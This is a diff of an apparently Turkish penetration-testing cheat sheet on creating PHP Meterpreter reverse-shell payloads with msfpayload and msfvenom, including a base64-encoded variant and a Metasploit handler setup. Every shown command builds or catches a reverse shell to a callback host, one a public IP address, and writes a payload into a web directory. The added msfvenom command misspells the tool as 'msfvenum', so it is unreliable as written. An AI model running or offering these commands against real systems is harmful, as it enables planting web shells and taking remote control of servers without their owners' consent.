@@ -57,6 +57,11 @@ PHP Meterpreter Olusturma
 1.:
 msfpayload php/meterpreter/reverse_tcp LHOST=85.95.238.172 LPORT=8080 R > /var/www/bgabank/meterpreter.txt
 
+Kali Linux 2.0 ile birlikte msfpayload kaldırılmıştır ve onun yerine msfvenum kullanılmaktadır
+msfvenum -p php/meterpreter/reverse_tcp LHOST=10.10.43.3 LPORT=4444 -f raw >shell.php
+www.netsec.ws/?p=331
+
+
 Encoded Meterpeter Olusturma
 1.1:
 msfpayload php/meterpreter/reverse_tcp LHOST=85.95.238.172 LPORT=8080 R | msfencode -e php/base64 -t raw > encoded.txt
@@ -68,6 +73,8 @@ set payload php/meterpreter/reverse_tcp
 set LHOST 85.95.238.172
 set LPORT 8080
 exploit
+
+
 
 
 
